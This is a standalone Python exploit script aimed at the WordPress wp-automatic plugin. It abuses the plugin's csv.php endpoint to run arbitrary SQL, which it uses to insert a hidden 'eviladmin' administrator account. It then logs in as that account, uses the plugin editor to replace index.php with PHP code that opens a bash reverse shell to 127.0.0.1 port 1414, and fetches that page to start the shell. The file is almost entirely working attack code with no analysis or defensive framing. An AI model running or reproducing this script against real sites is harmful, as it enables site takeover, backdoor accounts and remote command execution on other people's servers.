import requests
import hashlib
import re

domain = "http://localhost:80/wordpress"
wp_automatic_url = domain + "/wp-content/plugins/wp-automatic/inc/csv.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "11",
    "Content-Type": "application/x-www-form-urlencoded"
}

# INSERT new user
user_data = {
    "q": "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')",
    "auth": " ",
    "integ": "2420edd07fd8ceb35f9393e40305f37c"
}
r = requests.post(wp_automatic_url, headers=headers, data=user_data)

# Find ID of the user we just inserted
max_id = 10
for id in range(0, max_id):
    user_query = "SELECT * FROM `wp_users` WHERE user_login='eviladmin' AND ID=" + str(id)
    integ_hash = hashlib.md5(user_query.encode()).hexdigest()
    data = {"q": user_query, "integ": integ_hash}
    response = requests.post(wp_automatic_url, headers=headers, data=data)
    if ",,," in response.text:
        user_id = str(id)
        break

# Add Role Administrator to the user
role_data = {
    "q": f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1{{s:13:\"administrator\";s:1:\"1\";}}')",
    "auth": " ",
    "integ": "2420edd07fd8ceb35f9393e40305f37c"
}
r = requests.post(wp_automatic_url, headers=headers, data=role_data)

print('Successfully added Administrator account: eviladmin')

# Login
login_url = domain + "/wp-login.php"
login_data = {
    "log": "eviladmin",
    "pwd": "eviladmin",
    "wp-submit": "Log In",
    "redirect_to": "http://localhost/wordpress/wp-admin/users.php",
    "testcookie": "1"
}
session = requests.session()
session.post(login_url, headers=headers, data=login_data)

# Upload the shell
edit_wp_automatic_url = domain + "/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php&Submit=Select"
r = session.get(edit_wp_automatic_url, headers=headers)
nonce = re.search(r'<input type="hidden" id="nonce" name="nonce" value="([^"]+)" />', r.text).group(1)

if nonce:
    upload_url = domain + "/wp-admin/admin-ajax.php"
    payload_data = {
        "nonce": nonce,
        "_wp_http_referer": "/wordpress/wp-admin/plugin-editor.php?file=wp-automatic%2Findex.php&plugin=wp-automatic%2Fwp-automatic.php",
        "newcontent": "<?php \nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1414 0>&1'\");\n?>",
        "action": "edit-theme-plugin-file",
        "file": "wp-automatic/index.php",
        "plugin": "wp-automatic/wp-automatic.php",
        "docs-list": ''
    }
    r = session.post(upload_url, data=payload_data)

    print("Reverse shell is being sent")
    shell_url = domain + "/wp-content/plugins/wp-automatic/index.php"
    r = requests.get(shell_url, headers=headers)
    print("Shell has been executed")
else:
    print("Nonce not found. Shell upload failed.")
